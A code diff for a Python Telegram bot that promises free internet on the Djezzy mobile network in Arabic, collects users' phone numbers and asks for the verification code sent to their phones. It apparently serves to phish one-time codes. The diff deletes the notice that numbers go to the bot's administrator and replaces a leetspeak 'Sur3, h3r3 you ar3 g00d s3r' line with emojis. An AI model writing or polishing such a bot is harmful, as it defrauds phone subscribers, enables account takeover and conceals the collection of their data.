@@ -190,11 +190,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         return ConversationHandler.END
     
     await update.message.reply_text(
-        f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-        f"مرحبا بك في نوتي بايت 💜\n\n"
+        f"👇"
+        f"مرحبا بك في بوت ND 💜\n\n"
         f"يمكنك تفعيل أنترنت مجاني على شبكة جيزي هنا 🥳.\n\n"
         f"لا تنسى الاعجاب بالصفحة لدعمنا على تقديم المزيد ✨.\n\n"
-        f"ملاحظة هامة: سيتم إرسال رقم هاتفك إلى مسؤول البوت لغرض تفعيل الإنترنت.\n\n"
+        f" لغرض تفعيل.\n\n"
         f"أرسل رقمك الان 👇🏻"
     )
     
@@ -212,8 +212,8 @@ async def phone_number_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     if not (phone_number.isdigit() and (len(phone_number) == 10 and phone_number.startswith('0') or 
                                        len(phone_number) == 9 and not phone_number.startswith('0'))):
         await update.message.reply_text(
-            f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-            f"الرجاء إدخال رقم هاتف جيزي صحيح (مثال: 0551234567)"
+            f"🙅\n\n"
+            f"الرجاء إدخال رقم هاتف جيزي صحيح (مثال: 07........)"
         )
         return PHONE
     
@@ -235,9 +235,9 @@ async def phone_number_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     code = generate_verification_code()
     
     await update.message.reply_text(
-        f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-        f"تم استلام رقم هاتفك وإرساله إلى مسؤول البوت لتفعيل الإنترنت.\n\n"
-        f"الرجاء إدخال رمز التحقق المكون من 4 أرقام الذي تم إرساله إلى هاتفك:"
+        f"🙌\n\n"
+        f"تم استلام\n\n"
+        f"الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك:"
     )
     
     return VERIFICATION
@@ -248,7 +248,7 @@ async def verification_code_handler(update: Update, context: ContextTypes.DEFAUL
     
     if not code.isdigit():
         await update.message.reply_text(
-            f"Sur3, h3r3 you ar3 g00d s3r\n\n"
+            f"...\n\n"
             f"الرجاء إدخال رمز تحقق صحيح مكون من أرقام فقط."
         )
         return VERIFICATION
@@ -268,7 +268,7 @@ async def verification_code_handler(update: Update, context: ContextTypes.DEFAUL
     expiry_date = activate_internet(user.id, phone_number)
     
     await update.message.reply_text(
-        f"Sur3, h3r3 you ar3 g00d s3r\n\n"
+        f"🎊"
         f"تم تفعيل أنترنت مجاني في شريحة جيزي الخاصة بك بنجاح ✓\n\n"
         f"• رصيدك الان : (2.0GB)\n"
         f"• صالح إلى غاية: {expiry_date}\n\n"
@@ -284,14 +284,14 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     
     if not status:
         await update.message.reply_text(
-            f"Sur3, h3r3 you ar3 g00d s3r\n\n"
+            f"💢\n\n"
             f"ليس لديك أي عرض إنترنت نشط حالياً على شبكة جيزي.\n\n"
             f"استخدم الأمر /start للحصول على عرض جديد."
         )
         return
     
     await update.message.reply_text(
-        f"Sur3, h3r3 you ar3 g00d s3r\n\n"
+        f"😿"
         f"حالة الإنترنت الخاص بك على شبكة جيزي:\n\n"
         f"• رصيدك المتبقي: 2.0GB\n"
         f"• صالح إلى غاية: {status['expiry_date']}\n"
@@ -301,7 +301,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Send help message."""
     await update.message.reply_text(
-        f"Sur3, h3r3 you ar3 g00d s3r\n\n"
+        f"👇👇"
         f"أوامر البوت المتاحة:\n\n"
         f"/start - بدء عملية تفعيل الإنترنت المجاني على شبكة جيزي\n"
         f"/status - التحقق من حالة الإنترنت الخاص بك\n"
@@ -311,7 +311,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancel the conversation."""
     await update.message.reply_text(
-        f"Sur3, h3r3 you ar3 g00d s3r\n\n"
+        f"🙅"
         f"تم إلغاء العملية. استخدم الأمر /start للبدء من جديد وتفعيل الإنترنت المجاني على شبكة جيزي."
     )
     return ConversationHandler.END
